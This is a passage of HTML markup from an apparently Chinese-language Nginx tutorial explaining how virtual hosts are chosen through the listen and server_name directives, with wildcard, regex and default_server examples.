data-line=\"crayon-5a6f37c4d32be633532963-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32be633532963-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32be633532963-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32be633532963-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32be633532963-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32be633532963-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32be633532963-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32be633532963-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32be633532963-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32be633532963-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32be633532963-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32be633532963-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32be633532963-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32be633532963-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32be633532963-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32be633532963-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32be633532963-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32be633532963-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32be633532963-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32be633532963-20\">20</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32be633532963-1\"><span class=\"crayon-e\">server</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32be633532963-2\">  <span class=\"crayon-i\">listen</span>      <span class=\"crayon-o\">*</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">80</span> <span class=\"crayon-v\">default_server</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32be633532963-3\">  <span class=\"crayon-v\">server</span><span class=\"crayon-sy\">_</span>name <span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32be633532963-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32be633532963-5\">  <span class=\"crayon-st\">return</span> <span class=\"crayon-cn\">200</span> <span class=\"crayon-s\">\"Hello from netguru.co\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32be633532963-6\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32be633532963-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32be633532963-8\"><span class=\"crayon-e\">server</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32be633532963-9\">  <span class=\"crayon-i\">listen</span>      <span class=\"crayon-o\">*</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">80</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32be633532963-10\">  <span class=\"crayon-v\">server</span><span class=\"crayon-sy\">_</span>name <span class=\"crayon-v\">foo</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32be633532963-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32be633532963-12\">  <span class=\"crayon-st\">return</span> <span class=\"crayon-cn\">200</span> <span class=\"crayon-s\">\"Hello from foo.co\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32be633532963-13\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32be633532963-14\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32be633532963-15\"><span class=\"crayon-e\">server</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32be633532963-16\">  <span class=\"crayon-i\">listen</span>      <span class=\"crayon-o\">*</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">81</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32be633532963-17\">  <span class=\"crayon-v\">server</span><span class=\"crayon-sy\">_</span>name <span class=\"crayon-v\">bar</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32be633532963-18\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32be633532963-19\">  <span class=\"crayon-st\">return</span> <span class=\"crayon-cn\">200</span> <span class=\"crayon-s\">\"Hello from bar.co\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32be633532963-20\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0017 seconds] -->\r\n<p>这将告诉 Nginx 如何处理到来的请求。Nginx 将会首先通过检查 listen 指令来测试哪一个虚拟主机在监听给定的 IP 端口组合。</p>\n<p>然后，server_name 指令的值将检测 Host 头(存储着主机域名)。</p>\n<p>Nginx 将会按照下列顺序选择虚拟主机：</p>\n<ol>\n<li>匹配sever_name指令的IP-端口主机</li>\n<li>拥有default_server标记的IP-端口主机</li>\n<li>首先定义的IP-端口主机</li>\n<li>如果没有匹配，拒绝连接。</li>\n</ol>\n<p>例如下面的例子：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32c1123273852\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nRequest to foo.co:80     =&gt; \"Hello from foo.co\"\r\nRequest to www.foo.co:80 =&gt; \"Hello from netguru.co\"\r\nRequest to bar.co:80     =&gt; \"Hello from netguru.co\"\r\nRequest to bar.co:81     =&gt; \"Hello from bar.co\"\r\nRequest to foo.co:81     =&gt; \"Hello from bar.co\"</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32c1123273852-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32c1123273852-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32c1123273852-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32c1123273852-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32c1123273852-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32c1123273852-1\"><span class=\"crayon-i\">Request</span> <span class=\"crayon-st\">to</span> <span class=\"crayon-v\">foo</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">80</span>     <span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-s\">\"Hello from foo.co\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32c1123273852-2\"><span class=\"crayon-i\">Request</span> <span class=\"crayon-st\">to</span> <span class=\"crayon-v\">www</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">foo</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">80</span> <span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-s\">\"Hello from netguru.co\"</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32c1123273852-3\"><span class=\"crayon-i\">Request</span> <span class=\"crayon-st\">to</span> <span class=\"crayon-v\">bar</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">80</span>     <span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-s\">\"Hello from netguru.co\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32c1123273852-4\"><span class=\"crayon-i\">Request</span> <span class=\"crayon-st\">to</span> <span class=\"crayon-v\">bar</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">81</span>     <span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-s\">\"Hello from bar.co\"</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32c1123273852-5\"><span class=\"crayon-i\">Request</span> <span class=\"crayon-st\">to</span> <span class=\"crayon-v\">foo</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">81</span>     <span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-s\">\"Hello from bar.co\"</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n<p></p>\n<h3><code>server_name</code> 指令</h3>\n<p>server_name指令接受多个值。它还处理通配符匹配和正则表达式。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32c7263195590\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nserver_name netguru.co www.netguru.co; # exact match\r\nserver_name *.netguru.co;              # wildcard matching\r\nserver_name netguru.*;                 # wildcard matching\r\nserver_name  ~^[0-9]*\\.netguru\\.co$;   # regexp matching</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32c7263195590-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32c7263195590-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32c7263195590-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32c7263195590-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32c7263195590-1\"><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">_</span>name <span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">co</span> <span class=\"crayon-v\">www</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-sy\">;</span> <span class=\"crayon-p\"># exact match</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32c7263195590-2\"><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">_</span>name <span class=\"crayon-o\">*</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-sy\">;</span>              <span class=\"crayon-p\"># wildcard matching</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32c7263195590-3\"><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">_</span>name <span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">;</span>                 <span class=\"crayon-p\"># wildcard matching</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32c7263195590-4\"><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">_</span>name  <span class=\"crayon-o\">~</span><span class=\"crayon-o\">^</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">;</span>   <span class=\"crayon-p\"># regexp matching</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>当有歧义时，nginx 将使用下面的命令：</p>\n<ol>\n<li>确切的名字</li>\n<li>最长的通配符名称以星号开始，例如“* .example.org”。</li>\n<li>最长的通配符名称以星号结尾，例如“mail.**”</li>\n<li>首先匹配正则表达式（按照配置文件中的顺序）</li>\n</ol>\n<p>Nginx 会存储 3 个哈希表：确切的名字，以星号开始的通配符，和以星号结尾的通配符。如果结果不在任何表中，则将按顺序进行正则表达式测试。</p>\n<p>值得谨记的是</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32cb513781287\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nserver_name .netguru.co;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32cb513781287-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32cb513781287-1\"><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">_</span>name <span class=\"crayon-sy\">.</span><span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>是一个来自下面的缩写</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32ce444839356\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nserver_name  netguru.co  www.netguru.co  *.netguru.co;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32ce444839356-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32ce444839356-1\"><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">_</span>name  <span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">co</span>  <span class=\"crayon-v\">www</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">co</span>  <span class=\"crayon-o\">*</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>有一点不同，<code>.netguru.co</code> 存储在第二张表，这意味着它比显式声明的慢一点。</p>\n<h3><code>listen</code> 指令</h3>\n<p>在很多情况下，能够找到 listen 指令，接受IP:端口值</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32d1176260234\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlisten 127.0.0.1:80;\r\nlisten 127.0.0.1;    # by default port :80 is used\r\n\r\nlisten *:81;\r\nlisten 81;           # by default all ips are used\r\n\r\nlisten [::]:80;      # IPv6 addresses\r\nlisten [::1];        # IPv6 addresses</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32d1176260234-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32d1176260234-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32d1176260234-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32d1176260234-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32d1176260234-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32d1176260234-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32d1176260234-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32d1176260234-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32d1176260234-1\"><span class=\"crayon-i\">listen</span> <span class=\"crayon-cn\">127.0.0.1</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">80</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32d1176260234-2\"><span class=\"crayon-i\">listen</span> <span class=\"crayon-cn\">127.0.0.1</span><span class=\"crayon-sy\">;</span>    <span class=\"crayon-p\"># by default port :80 is used</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32d1176260234-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32d1176260234-4\"><span class=\"crayon-i\">listen</span> <span class=\"crayon-o\">*</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">81</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32d1176260234-5\"><span class=\"crayon-i\">listen</span> <span class=\"crayon-cn\">81</span><span class=\"crayon-sy\">;</span>           <span class=\"crayon-p\"># by default all ips are used</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32d1176260234-6\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32d1176260234-7\"><span class=\"crayon-i\">listen</span> <span class=\"crayon-sy\">[</span><span class=\"crayon-o\">::</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">80</span><span class=\"crayon-sy\">;</span>      <span class=\"crayon-p\"># IPv6 addresses</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32d1176260234-8\"><span class=\"crayon-i\">listen</span> <span class=\"crayon-sy\">[</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span>        <span class=\"crayon-p\"># IPv6 addresses</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>然而，还可以指定 UNIX-domain 套接字。</p><!-- Crayon Syntax Highlighter 